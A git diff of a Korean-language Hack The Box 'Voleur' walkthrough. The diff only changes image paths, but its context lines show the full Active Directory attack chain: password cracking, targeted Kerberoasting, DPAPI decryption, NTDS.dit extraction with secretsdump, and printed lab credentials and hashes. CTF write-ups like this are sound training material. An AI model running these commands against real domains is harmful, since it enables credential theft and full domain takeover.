@@ -35,7 +35,7 @@ NTLM 인증이 비활성화된 Kerberos-only 환경에서 SMB 공유의 암호�
 nmap -sC -sV 10.129.37.32
 ```
 
-![nmap scan](nmap-scan.png)
+![nmap scan](images/nmap-scan.png)
 
 열린 포트 조합이 전형적인 Active Directory Domain Controller 프로파일을 보여준다.
 
@@ -87,13 +87,13 @@ sudo tee /etc/krb5.conf > /dev/null <<EOF
 EOF
 ```
 
-![krb5 conf](krb5-conf.png)
+![krb5 conf](images/krb5-conf.png)
 
 ### NTLM 비활성화 확인
 
 제공된 크리덴셜로 SMB 인증을 시도하면 `STATUS_NOT_SUPPORTED`와 `NTLM:False`가 반환된다.
 
-![ntlm disabled](ntlm-disabled.png)
+![ntlm disabled](images/ntlm-disabled.png)
 
 도메인이 NTLM 인증을 완전히 차단하고 Kerberos만 허용한다. 이후 모든 도구에 `-k` 옵션을 사용해 Kerberos 인증을 강제해야 한다.
 
@@ -107,7 +107,7 @@ sudo ntpdate -u 10.129.37.32 && \
 export KRB5CCNAME=$(pwd)/ryan.naylor.ccache
 ```
 
-![getTGT ryan](getTGT-ryan.png)
+![getTGT ryan](images/getTGT-ryan.png)
 
 TGT를 캐시에 로드한 뒤 SMB 공유 목록을 조회한다.
 
@@ -115,7 +115,7 @@ TGT를 캐시에 로드한 뒤 SMB 공유 목록을 조회한다.
 netexec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
 ```
 
-![smb shares](smb-shares.png)
+![smb shares](images/smb-shares.png)
 
 | 공유 | 권한 | 분류 |
 |------|------|------|
@@ -138,11 +138,11 @@ netexec smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
 impacket-smbclient -k -no-pass ryan.naylor@dc.voleur.htb
 ```
 
-![it share ls](it-share-ls.png)
+![it share ls](images/it-share-ls.png)
 
 IT 공유 내부에 `First-Line Support` 디렉터리가 존재한다.
 
-![it share file](it-share-file.png)
+![it share file](images/it-share-file.png)
 
 `Access_Review.xlsx` 파일을 발견했다. 파일명 자체가 사용자, 권한, 접근 정보를 담고 있을 가능성을 시사한다.
 
@@ -150,13 +150,13 @@ IT 공유 내부에 `First-Line Support` 디렉터리가 존재한다.
 get "Access_Review.xlsx"
 ```
 
-![smb get xlsx](smb-get-xlsx.png)
+![smb get xlsx](images/smb-get-xlsx.png)
 
 ### Excel 파일 패스워드 크래킹
 
 파일을 열면 패스워드 보호가 적용되어 있다.
 
-![xlsx password protected](xlsx-password-protected.png)
+![xlsx password protected](images/xlsx-password-protected.png)
 
 `office2john`으로 파일에서 크래킹 가능한 해시를 추출한다.
 
@@ -165,7 +165,7 @@ office2john Access_Review.xlsx > xlsx.hash
 cat xlsx.hash
 ```
 
-![office2john](office2john.png)
+![office2john](images/office2john.png)
 
 해시 앞의 파일명 prefix를 제거해야 hashcat이 올바르게 처리한다.
 
@@ -173,13 +173,13 @@ cat xlsx.hash
 john xlsx.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![john crack xlsx](john-crack-xlsx.png)
+![john crack xlsx](images/john-crack-xlsx.png)
 
 패스워드 `football1`이 크래킹됐다. LibreOffice로 파일을 열어 내용을 확인한다.
 
 ### Access_Review.xlsx 분석
 
-![access review xlsx](access-review-xlsx.png)
+![access review xlsx](images/access-review-xlsx.png)
 
 파일에는 도메인 사용자, 권한, 노트 정보가 포함되어 있다.
 
@@ -214,7 +214,7 @@ sudo ntpdate -u 10.129.37.32 && \
 export KRB5CCNAME=$(pwd)/svc_ldap.ccache
 ```
 
-![getTGT svc ldap](getTGT-svc-ldap.png)
+![getTGT svc ldap](images/getTGT-svc-ldap.png)
 
 ### Targeted Kerberoasting — WriteSPN 악용
 
@@ -233,13 +233,13 @@ sudo ntpdate -u 10.129.37.32 && \
   -u svc_ldap@voleur.htb -k --no-pass -o hashes.txt
 ```
 
-![targeted kerberoast clone](targeted-kerberoast-clone.png)
+![targeted kerberoast clone](images/targeted-kerberoast-clone.png)
 
 lacey.miller와 svc_winrm 두 계정의 TGS 해시가 추출됐다.
 
-![kerberoast hash lacey](kerberoast-hash-lacey.png)
+![kerberoast hash lacey](images/kerberoast-hash-lacey.png)
 
-![kerberoast hash svcwinrm](kerberoast-hash-svcwinrm.png)
+![kerberoast hash svcwinrm](images/kerberoast-hash-svcwinrm.png)
 
 john으로 해시를 크래킹한다.
 
@@ -247,7 +247,7 @@ john으로 해시를 크래킹한다.
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![john crack kerberoast](john-crack-kerberoast.png)
+![john crack kerberoast](images/john-crack-kerberoast.png)
 
 ```
 svc_winrm : AFireInsidedeOzarctica980219afi
@@ -266,13 +266,13 @@ export KRB5CCNAME=$(pwd)/svc_winrm.ccache
 evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
 ```
 
-![evil winrm svcwinrm](evil-winrm-svcwinrm.png)
+![evil winrm svcwinrm](images/evil-winrm-svcwinrm.png)
 
 ```powershell
 type C:\Users\svc_winrm\Desktop\user.txt
 ```
 
-![user flag](user-flag.png)
+![user flag](images/user-flag.png)
 
 ---
 
@@ -288,7 +288,7 @@ RunasCs.exe를 업로드하여 svc_winrm 컨텍스트에서 svc_ldap의 권한�
 upload RunasCs.exe
 ```
 
-![runasc upload](runasc-upload.png)
+![runasc upload](images/runasc-upload.png)
 
 삭제된 AD 객체를 조회한다.
 
@@ -296,7 +296,7 @@ upload RunasCs.exe
 ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -Properties distinguishedName,objectSid -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"
 ```
 
-![get adobject deleted](get-adobject-deleted.png)
+![get adobject deleted](images/get-adobject-deleted.png)
 
 Todd Wolfe의 삭제된 계정 객체가 확인된다. DistinguishedName을 사용해 복구한다.
 
@@ -304,7 +304,7 @@ Todd Wolfe의 삭제된 계정 객체가 확인된다. DistinguishedName을 사�
 ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Restore-ADObject 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'"
 ```
 
-![restore adobject](restore-adobject.png)
+![restore adobject](images/restore-adobject.png)
 
 `No output received from the process` — 오류 없이 완료됐다. Excel 파일에서 확인한 Todd.Wolfe의 패스워드 `NightT1meP1dg3on14`로 TGT를 발급하면 계정이 정상 복구된 것을 확인할 수 있다.
 
@@ -331,7 +331,7 @@ impacket-smbclient -k -no-pass todd.wolfe@dc.voleur.htb
 # get 772275FAD58525253490A9B0039791D3          ← 크리덴셜 블롭
 ```
 
-![smb dpapi files](smb-dpapi-files.png)
+![smb dpapi files](images/smb-dpapi-files.png)
 
 **DPAPI(Data Protection API)**는 Windows에서 사용자의 패스워드를 마스터키로 파생시켜 민감한 데이터를 암호화하는 시스템이다. 마스터키 파일은 사용자의 SID와 패스워드로 복호화할 수 있으며, 이를 통해 크리덴셜 블롭의 평문을 얻을 수 있다.
 
@@ -344,7 +344,7 @@ impacket-dpapi masterkey \
   -password NightT1meP1dg3on14
 ```
 
-![dpapi masterkey](dpapi-masterkey.png)
+![dpapi masterkey](images/dpapi-masterkey.png)
 
 복호화된 마스터키로 크리덴셜 블롭을 복호화한다.
 
@@ -354,7 +354,7 @@ impacket-dpapi credential \
   -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
 ```
 
-![dpapi credential](dpapi-credential.png)
+![dpapi credential](images/dpapi-credential.png)
 
 ```
 Username : jeremy.combs
@@ -388,7 +388,7 @@ dir
 type Note.txt.txt
 ```
 
-![note txt](note-txt.png)
+![note txt](images/note-txt.png)
 
 메모에서 관리자가 WSL을 통한 Linux 백업 도구 도입을 실험 중임이 확인된다. 같은 디렉터리에 `id_rsa` 파일이 존재한다.
 
@@ -396,7 +396,7 @@ type Note.txt.txt
 download id_rsa
 ```
 
-![download id rsa](download-id-rsa.png)
+![download id rsa](images/download-id-rsa.png)
 
 nmap에서 확인한 포트 2222의 Ubuntu SSH에 svc_backup으로 접속을 시도한다.
 
@@ -405,7 +405,7 @@ chmod 600 ~/targetedKerberoast/id_rsa
 ssh -i ~/targetedKerberoast/id_rsa svc_backup@10.129.37.32 -p 2222
 ```
 
-![ssh svc backup](ssh-svc-backup.png)
+![ssh svc backup](images/ssh-svc-backup.png)
 
 `svc_backup@DC` — Ubuntu 20.04 LTS 환경에 접속했다. 호스트명 `DC`가 Windows DC와 동일하며, 마운트 경로에서 Windows 파일시스템이 `/mnt/c/`에 마운트되어 있음을 확인할 수 있다.
 
@@ -427,7 +427,7 @@ scp -i id_rsa -P 2222 \
   ./ntds.dit
 ```
 
-![scp ntds](scp-ntds.png)
+![scp ntds](images/scp-ntds.png)
 
 ### secretsdump로 도메인 해시 추출
 
@@ -439,7 +439,7 @@ impacket-secretsdump \
   LOCAL
 ```
 
-![secretsdump](secretsdump.png)
+![secretsdump](images/secretsdump.png)
 
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
@@ -459,13 +459,13 @@ export KRB5CCNAME=~/targetedKerberoast/administrator.ccache
 evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
 ```
 
-![evil winrm admin](evil-winrm-admin.png)
+![evil winrm admin](images/evil-winrm-admin.png)
 
 ```powershell
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-![root flag](root-flag.png)
+![root flag](images/root-flag.png)
 
 ---
 
@@ -512,4 +512,3 @@ WSL을 통한 Linux 서브시스템은 편의성을 위해 도입되지만, Wind
 | NTDS.dit 추출 | 백업 파일 SCP 전송 | scp |
 | 해시 덤프 | NTDS.dit에서 전체 도메인 해시 추출 | impacket-secretsdump |
 | Domain Admin | Administrator NT 해시로 TGT 발급 후 접속 | impacket-getTGT, evil-winrm |
-
